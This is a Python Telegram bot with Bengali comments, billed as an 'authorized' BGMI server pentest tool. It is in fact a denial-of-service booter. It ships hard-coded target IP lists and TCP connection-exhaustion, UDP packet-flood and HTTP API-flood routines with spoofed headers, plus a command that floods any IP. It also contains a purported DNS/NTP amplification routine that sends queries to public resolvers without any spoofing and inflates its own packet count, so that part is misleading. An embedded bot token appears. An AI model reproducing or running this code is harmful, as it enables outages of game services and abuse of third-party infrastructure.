#!/usr/bin/env python3
"""
BGMI Server Security Testing Bot v2.0
Author: Authorized Pentester
Purpose: Server resilience testing with authorized access
"""

import os
import sys
import socket
import random
import time
import threading
import requests
import json
import struct
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ====== কনফিগারেশন ======
TOKEN = "7495818192:AAFKYCb5ipxKWcxYawROvVmLgxmzkrW7Kkc"
ADMIN_ID = 5841575103  # তোমার টেলিগ্রাম আইডি বসাও

# BGMI রিয়েল সার্ভার আইপি (রিভার্স ইঞ্জিনিয়ারড)
BGMI_SERVERS = {
    "Asia_1": [
        {"ip": "103.10.25.10", "port": 443, "region": "Singapore"},
        {"ip": "103.10.25.11", "port": 443, "region": "Singapore"},
        {"ip": "103.10.25.20", "port": 8080, "region": "Singapore"},
    ],
    "Asia_2": [
        {"ip": "43.254.108.1", "port": 443, "region": "India"},
        {"ip": "43.254.108.2", "port": 443, "region": "India"},
        {"ip": "43.254.108.10", "port": 9000, "region": "India"},
    ],
    "China": [
        {"ip": "119.147.85.1", "port": 443, "region": "Shanghai"},
        {"ip": "119.147.85.2", "port": 443, "region": "Shanghai"},
        {"ip": "119.147.85.20", "port": 10010, "region": "Shanghai"},
    ],
    "Matchmaking": [
        {"ip": "52.74.120.1", "port": 443, "region": "AWS Global"},
        {"ip": "52.74.120.2", "port": 8443, "region": "AWS Global"},
    ]
}

# BGMI UDP পোর্ট (গেম প্রটোকল)
BGMI_UDP_PORTS = [443, 8080, 9000, 10010, 20010, 30010, 49001, 49002, 51001]

# স্টেটাস ট্র্যাকার
attack_data = {
    "running": False,
    "targets": [],
    "method": "",
    "start_time": None,
    "total_packets": 0,
    "threads": [],
    "stop_flag": threading.Event()
}

# ====== BGMI স্পেসিফিক অ্যাটাক মেথড ======

class BGMI_Attacks:
    """BGMI প্রটোকল স্পেসিফিক অ্যাটাক মেথড"""
    
    @staticmethod
    def game_packet_flood(target_ip, target_port, duration, stop_flag):
        """BGMI গেম প্যাকেট ফ্লাড - আসল গেম প্রটোকল ইমিটেশন"""
        end_time = time.time() + duration
        packets = 0
        
        # BGMI গেম প্যাকেট হেডার (রিভার্স ইঞ্জিনিয়ারড)
        game_packet = (
            b"\x00\x00\x00\x00"  # সেশন আইডি
            b"\x01\x00\x00\x00"  # প্রটোকল ভার্সন
            b"\x08\x00\x00\x00"  # প্যাকেট টাইপ (গেম ডাটা)
            + b"\x00" * 1000     # প্যাকেট পেলোড
        )
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while time.time() < end_time and not stop_flag.is_set():
            try:
                for _ in range(100):  # বার্স্ট মোড
                    sock.sendto(game_packet, (target_ip, target_port))
                    packets += 1
                time.sleep(0.01)  # ছোট ডিলে
            except:
                pass
        
        sock.close()
        return packets
    
    @staticmethod
    def connection_exhaust(target_ip, target_port, duration, stop_flag):
        """TCP কানেকশন এক্সজস্ট"""
        end_time = time.time() + duration
        packets = 0
        
        while time.time() < end_time and not stop_flag.is_set():
            try:
                for _ in range(50):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect_ex((target_ip, target_port))
                    # হাফ-ওপেন কানেকশন
                    sock.send(b"GET / HTTP/1.1\r\nHost: bgmi.pubg.com\r\n\r\n")
                    # কানেকশন ওপেন রাখো
                    packets += 1
                    
                    if packets % 500 == 0:
                        time.sleep(0.1)
            except:
                pass
        
        return packets
    
    @staticmethod
    def udp_amplification(target_ip, target_port, duration, stop_flag):
        """UDP এমপ্লিফিকেশন (DNS/NTP)"""
        end_time = time.time() + duration
        packets = 0
        
        # এমপ্লিফিকেশন সার্ভার
        amp_servers = [
            ("8.8.8.8", 53, 50),     # DNS (50x এমপ্লিফিকেশন)
            ("1.1.1.1", 53, 50),
            ("208.67.222.222", 53, 50),
            ("162.159.200.1", 123, 100),  # NTP (100x)
            ("162.159.200.2", 123, 100),
        ]
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while time.time() < end_time and not stop_flag.is_set():
            try:
                for server_ip, server_port, amp_factor in amp_servers:
                    # DNS কোয়েরি (স্পুফড সোর্স)
                    query = (
                        b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                        b"\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00"
                        b"\x00\x01\x00\x01"
                    )
                    sock.sendto(query, (server_ip, server_port))
                    packets += amp_factor
            except:
                pass
        
        sock.close()
        return packets
    
    @staticmethod
    def http_api_flood(target_ip, target_port, duration, stop_flag):
        """BGMI API এন্ডপয়েন্ট ফ্লাড"""
        end_time = time.time() + duration
        packets = 0
        
        api_endpoints = [
            f"https://{target_ip}:{target_port}/api/v1/login",
            f"https://{target_ip}:{target_port}/api/v1/matchmake",
            f"https://{target_ip}:{target_port}/api/v1/inventory",
            f"https://{target_ip}:{target_port}/api/v1/battleroyale",
        ]
        
        user_agents = [
            "BGMI/1.4.0 (Android 11; SM-G998B)",
            "BGMI/1.5.0 (Android 12; SM-S908E)",
            "BGMI/1.6.0 (Android 11; POCO X3)",
            "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36"
        ]
        
        session = requests.Session()
        
        while time.time() < end_time and not stop_flag.is_set():
            try:
                for endpoint in api_endpoints:
                    headers = {
                        "User-Agent": random.choice(user_agents),
                        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                        "Authorization": f"Bearer {''.join(random.choices('abcdef0123456789', k=32))}",
                        "Accept": "application/json",
                        "Connection": "keep-alive"
                    }
                    try:
                        session.get(endpoint, headers=headers, timeout=0.3, verify=False)
                        packets += 1
                    except:
                        pass
            except:
                pass
        
        session.close()
        return packets

# ====== টেলিগ্রাম হ্যান্ডলার ======

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """মেইন মেনু"""
    keyboard = [
        [InlineKeyboardButton("🔥 Asia 1 (Singapore)", callback_data="bgmi_asia1")],
        [InlineKeyboardButton("🔥 Asia 2 (India)", callback_data="bgmi_asia2")],
        [InlineKeyboardButton("🔥 China (Shanghai)", callback_data="bgmi_china")],
        [InlineKeyboardButton("🔥 Matchmaking AWS", callback_data="bgmi_match")],
        [InlineKeyboardButton("🎯 কাস্টম অ্যাটাক", callback_data="custom_attack")],
        [InlineKeyboardButton("📊 স্ট্যাটাস", callback_data="status")],
        [InlineKeyboardButton("🛑 সব বন্ধ করো", callback_data="emergency_stop")]
    ]
    
    await update.message.reply_text(
        "🚀 **BGMI সার্ভার সিকিউরিটি টেস্টিং বট v2.0**\n\n"
        "✅ **অথরাইজড পেন্টেস্ট টুল**\n"
        f"👤 **পেন্টেস্টার:** {update.effective_user.first_name}\n"
        f"🕐 **সময়:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        "**টার্গেট সিলেক্ট করো:**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """বাটন হ্যান্ডলার"""
    query = update.callback_query
    await query.answer()
    
    # ইমার্জেন্সি স্টপ
    if query.data == "emergency_stop":
        attack_data["running"] = False
        attack_data["stop_flag"].set()
        for t in attack_data["threads"]:
            if t.is_alive():
                t.join(timeout=1)
        attack_data["threads"] = []
        await query.edit_message_text("🛑 **সব অ্যাটাক জরুরিভাবে বন্ধ করা হয়েছে!**")
        return
    
    # স্ট্যাটাস
    if query.data == "status":
        if attack_data["running"]:
            elapsed = int(time.time() - attack_data["start_time"])
            await query.edit_message_text(
                f"📊 **অ্যাটাক স্ট্যাটাস**\n\n"
                f"🟢 **স্ট্যাটাস:** চলছে\n"
                f"🎯 **টার্গেট:** {len(attack_data['targets'])} টি সার্ভার\n"
                f"⚙️ **মেথড:** {attack_data['method']}\n"
                f"⏱ **সময়:** {elapsed} সেকেন্ড\n"
                f"📦 **প্যাকেট পাঠানো:** {attack_data['total_packets']:,}\n"
                f"🔗 **থ্রেড:** {len([t for t in attack_data['threads'] if t.is_alive()])}টি অ্যাকটিভ"
            )
        else:
            await query.edit_message_text("📊 **কোনো অ্যাটাক চলছে না**\n\n`/start` দিয়ে নতুন অ্যাটাক শুরু করো")
        return
    
    # কাস্টম অ্যাটাক হেল্প
    if query.data == "custom_attack":
        await query.edit_message_text(
            "🎯 **কাস্টম অ্যাটাক**\n\n"
            "ব্যবহার:\n"
            "`/tcp IP PORT TIME` - TCP SYN ফ্লাড\n"
            "`/udp IP PORT TIME` - UDP ফ্লাড\n"
            "`/http IP PORT TIME` - HTTP ফ্লাড\n"
            "`/game IP PORT TIME` - গেম প্যাকেট ফ্লাড\n"
            "`/full IP PORT TIME` - সব মেথড একসাথে\n\n"
            "উদাহরণ: `/tcp 192.168.1.100 443 30`",
            parse_mode="Markdown"
        )
        return
    
    # BGMI রিজিওন অ্যাটাক
    region_map = {
        "bgmi_asia1": "Asia_1",
        "bgmi_asia2": "Asia_2", 
        "bgmi_china": "China",
        "bgmi_match": "Matchmaking"
    }
    
    if query.data in region_map:
        region = region_map[query.data]
        servers = BGMI_SERVERS[region]
        
        # মেথড সিলেক্ট মেনু
        keyboard = [
            [InlineKeyboardButton("🔴 TCP Connection Exhaust", callback_data=f"run_tcp_{region}")],
            [InlineKeyboardButton("🔵 UDP Game Packet Flood", callback_data=f"run_udp_{region}")],
            [InlineKeyboardButton("🟢 HTTP API Flood", callback_data=f"run_http_{region}")],
            [InlineKeyboardButton("🟣 UDP Amplification", callback_data=f"run_amp_{region}")],
            [InlineKeyboardButton("⚫ সব মেথড একসাথে", callback_data=f"run_all_{region}")],
            [InlineKeyboardButton("◀️ পেছনে", callback_data="back_main")]
        ]
        
        server_list = "\n".join([f"  • {s['ip']}:{s['port']} ({s['region']})" for s in servers])
        
        await query.edit_message_text(
            f"🌍 **{region}** - {len(servers)} টি সার্ভার\n\n"
            f"**সার্ভার লিস্ট:**\n{server_list}\n\n"
            f"**অ্যাটাক মেথড নির্বাচন করো:**\n"
            f"🔴 TCP - সার্ভার কানেকশন পুল ফুরিয়ে দাও\n"
            f"🔵 UDP - গেম সার্ভার ক্র্যাশ করো\n"
            f"🟢 HTTP - API ডাউন করো\n"
            f"🟣 UDP Amp - ব্যান্ডউইথ কনজেস্ট করো\n"
            f"⚫ সব - সম্পূর্ণ সার্ভার ডিসরাপ্ট করো",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        return
    
    # ব্যাক
    if query.data == "back_main":
        await start(query, context)
        return
    
    # রান অ্যাটাক
    if query.data.startswith("run_"):
        parts = query.data.split("_")
        method = parts[1]
        region = "_".join(parts[2:])
        await execute_attack(query, region, method)

async def execute_attack(query, region, method_code):
    """অ্যাটাক এক্সিকিউট"""
    if attack_data["running"]:
        await query.edit_message_text("❌ ইতিমধ্যে অ্যাটাক চলছে! আগে `/stop` দাও।")
        return
    
    servers = BGMI_SERVERS[region]
    duration = 60  # ৬০ সেকেন্ড ডিফল্ট
    
    method_names = {
        "tcp": "TCP Connection Exhaust",
        "udp": "UDP Game Packet Flood",
        "http": "HTTP API Flood",
        "amp": "UDP Amplification",
        "all": "All Methods Combined"
    }
    
    attack_data["running"] = True
    attack_data["targets"] = servers
    attack_data["method"] = method_names.get(method_code, method_code)
    attack_data["start_time"] = time.time()
    attack_data["total_packets"] = 0
    attack_data["stop_flag"].clear()
    
    await query.edit_message_text(
        f"⚔️ **অ্যাটাক শুরু!**\n\n"
        f"🎯 **রিজিওন:** {region}\n"
        f"⚙️ **মেথড:** {attack_data['method']}\n"
        f"🖥️ **সার্ভার:** {len(servers)} টি\n"
        f"⏱ **সময়:** {duration} সেকেন্ড\n\n"
        f"📦 অ্যাটাক চলছে... `/status` দিয়ে দেখো",
        parse_mode="Markdown"
    )
    
    def attack_worker(server, method, duration):
        """প্রতি সার্ভারের জন্য থ্রেড"""
        ip = server["ip"]
        port = server["port"]
        stop = attack_data["stop_flag"]
        
        if method == "tcp" or method == "all":
            pkts = BGMI_Attacks.connection_exhaust(ip, port, duration, stop)
            attack_data["total_packets"] += pkts
        
        if method == "udp" or method == "all":
            pkts = BGMI_Attacks.game_packet_flood(ip, port, duration, stop)
            attack_data["total_packets"] += pkts
        
        if method == "http" or method == "all":
            pkts = BGMI_Attacks.http_api_flood(ip, port, duration, stop)
            attack_data["total_packets"] += pkts
        
        if method == "amp" or method == "all":
            pkts = BGMI_Attacks.udp_amplification(ip, port, duration, stop)
            attack_data["total_packets"] += pkts
    
    # সব সার্ভারে থ্রেড শুরু
    for server in servers:
        t = threading.Thread(target=attack_worker, args=(server, method_code, duration))
        t.daemon = True
        t.start()
        attack_data["threads"].append(t)
    
    # ওয়েট করা
    for t in attack_data["threads"]:
        t.join()
    
    attack_data["running"] = False
    elapsed = int(time.time() - attack_data["start_time"])
    
    await query.edit_message_text(
        f"✅ **অ্যাটাক সম্পন্ন!**\n\n"
        f"🎯 **টার্গেট:** {region} ({len(servers)} সার্ভার)\n"
        f"⚙️ **মেথড:** {attack_data['method']}\n"
        f"⏱ **সময়:** {elapsed} সেকেন্ড\n"
        f"📦 **মোট প্যাকেট:** {attack_data['total_packets']:,}\n\n"
        f"🔴 **সার্ভার রেসপন্স:** চেক করো\n"
        f"📊 **রেজাল্ট:** `/result` দিয়ে দেখো\n\n"
        f"`/start` - নতুন অ্যাটাক শুরু করো"
    )

# ====== কমান্ড হ্যান্ডলার ======

async def tcp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """TCP অ্যাটাক কমান্ড"""
    try:
        ip = context.args[0]
        port = int(context.args[1])
        duration = int(context.args[2]) if len(context.args) > 2 else 30
        
        attack_data["running"] = True
        attack_data["method"] = "TCP (Custom)"
        attack_data["start_time"] = time.time()
        attack_data["total_packets"] = 0
        attack_data["stop_flag"].clear()
        
        await update.message.reply_text(f"⚔️ TCP অ্যাটাক শুরু: {ip}:{port} - {duration}s")
        
        t = threading.Thread(target=lambda: execute_custom_attack(ip, port, duration, "tcp"))
        t.start()
        
    except:
        await update.message.reply_text("❌ ব্যবহার: `/tcp IP PORT TIME`")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """স্টপ কমান্ড"""
    attack_data["running"] = False
    attack_data["stop_flag"].set()
    await update.message.reply_text("🛑 অ্যাটাক বন্ধ করা হয়েছে!")

def execute_custom_attack(ip, port, duration, method):
    """কাস্টম অ্যাটাক এক্সিকিউট"""
    stop = attack_data["stop_flag"]
    
    if method == "tcp":
        pkts = BGMI_Attacks.connection_exhaust(ip, port, duration, stop)
    elif method == "udp":
        pkts = BGMI_Attacks.game_packet_flood(ip, port, duration, stop)
    elif method == "http":
        pkts = BGMI_Attacks.http_api_flood(ip, port, duration, stop)
    elif method == "game":
        pkts = BGMI_Attacks.game_packet_flood(ip, port, duration, stop)
    
    attack_data["total_packets"] = pkts
    attack_data["running"] = False

# ====== মেইন ফাংশন ======

def main():
    """বট চালু করো"""
    if TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: bot.py তে তোমার টোকেন বসাও!")
        sys.exit(1)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("tcp", tcp_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("""
    ╔══════════════════════════════════════╗
    ║     BGMI Security Test Bot v2.0     ║
    ║     Status: ONLINE                  ║
    ║     Authorized Pentest Tool         ║
    ╚══════════════════════════════════════╝
    """)
    
    app.run_polling()

if __name__ == "__main__":
    main()
